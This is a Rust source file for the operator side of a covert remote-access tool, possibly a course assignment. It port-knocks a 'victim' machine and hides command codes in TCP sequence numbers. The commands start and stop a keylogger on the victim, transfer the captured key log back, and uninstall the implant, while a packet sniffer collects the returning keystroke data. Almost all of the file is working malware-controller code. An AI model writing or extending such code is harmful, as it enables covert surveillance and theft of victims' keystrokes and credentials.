use std::io::{self, Write};
use std::path::PathBuf;
use std::net::Ipv4Addr;

mod port_knkr;
mod pcap_capture;
mod keylogger; // Assuming you have your keylogger.rs in the same project

use port_knkr::KnockSession;
use pcap_capture::PcapHandle;

#[derive(Debug, PartialEq)]
enum SessionState {
    Disconnected,
    Connected,
}

struct Commander {
    state: SessionState,
    knock_session: Option<KnockSession>,
    victim_ip: Option<Ipv4Addr>, // Store the IP here
}

impl Commander {
    fn new() -> Self {
        Self {
            state: SessionState::Disconnected,
            knock_session: None,
            victim_ip: None,
        }
    }

    fn run(&mut self) {
        loop {
            match self.state {
                SessionState::Disconnected => self.disconnected_menu(),
                SessionState::Connected => self.connected_menu(),
            }
        }
    }

    /* =========================
     * COVERT COMMAND DISPATCHER
     * ========================= */

    /// Requirement: All communication via covert channels.
    /// We send a "Command Code" hidden in the TCP Sequence Number.
    fn send_command(&self, cmd_code: u32) {
        if let Some(ip) = self.victim_ip {
            // Using Port 9000 as our "Command Listener" port on the victim
            if let Err(e) = port_knkr::send_covert_packet(ip, 9000, cmd_code) {
                println!("[!] Failed to send covert command: {}", e);
            }
        } else {
            println!("[!] No victim IP stored. Cannot send command.");
        }
    }

    /* =========================
     * MENUS
     * ========================= */

    fn disconnected_menu(&mut self) {
        println!("\n=== Commander ===");
        println!("1) Initiate session (port knock)");
        println!("0) Exit");

        match prompt("Select option: ").as_str() {
            "1" => self.port_knock(),
            "0" => {
                println!("Exiting commander.");
                std::process::exit(0);
            }
            _ => println!("Invalid option"),
        }
    }

    fn connected_menu(&mut self) {
        println!("\n=== Commander (Session Active: {}) ===", self.victim_ip.unwrap());
        println!("1) Disconnect from victim");
        println!("2) Uninstall from victim");
        println!("3) Start the keylogger on the victim");
        println!("4) Stop the keylogger on the victim");
        println!("5) Transfer the key log file from the victim");
        println!("0) Exit Program");

        match prompt("Select option: ").as_str() {
            "1" => self.disconnect(),
            "2" => self.uninstall(),
            "3" => self.start_keylogger(),
            "4" => self.stop_keylogger(),
            "5" => self.transfer_keylog(),
            "0" => std::process::exit(0),
            _ => println!("Invalid option"),
        }
    }

    /* =========================
     * SESSION CONTROL
     * ========================= */

    fn port_knock(&mut self) {
        // Prompt for IP once and store it
        let ip_input = prompt("Enter victim IP (default 0.0.0.0): ");
        let ip: Ipv4Addr = if ip_input.is_empty() { 
            "0.0.0.0".parse().unwrap() 
        } else { 
            ip_input.parse().expect("Invalid IP") 
        };

        // Note: You may need to modify your port_knkr::port_knock to accept the IP 
        // as an argument instead of prompting inside the function for better flow.
        match port_knkr::port_knock() { 
            Ok(session) => {
                println!("[✓] Port knock sequence sent to {}", ip);
                self.knock_session = Some(session);
                self.victim_ip = Some(ip); // SUCCESS: Store IP for future commands
                self.state = SessionState::Connected;
            }
            Err(e) => println!("[!] Port knock failed: {}", e),
        }
    }

    fn disconnect(&mut self) {
        println!("[*] Disconnecting from victim...");
        if let Some(session) = self.knock_session.take() {
            session.stop();
        }
        self.victim_ip = None;
        self.state = SessionState::Disconnected;
    }

    /* =========================
     * COMMAND IMPLEMENTATIONS
     * ========================= */

    fn start_keylogger(&self) {
        println!("[*] Sending Covert START (Code 100)...");
        self.send_command(100);
    }

    fn stop_keylogger(&self) {
        println!("[*] Sending Covert STOP (Code 101)...");
        self.send_command(101);
    }

    fn transfer_keylog(&self) {
        println!("[*] Sending Covert TRANSFER command (Code 102)...");
        self.send_command(102);
        println!("[*] Watch console for incoming keylog data stream.");
    }

    fn uninstall(&self) {
        println!("[*] Sending Covert UNINSTALL (Code 999)...");
        self.send_command(999);
        // After uninstall, we should probably disconnect
    }
}

/* =========================
 * UTIL & MAIN
 * ========================= */

fn prompt(msg: &str) -> String {
    print!("{}", msg);
    io::stdout().flush().unwrap();
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    input.trim().to_string()
}

fn main() {
    // Start sniffing on the interface (e.g., "eth0" or "lo")
    // This will capture the incoming data sent back by the victim
    let _pcap = PcapHandle::start("lo");

    let mut commander = Commander::new();
    commander.run();
}
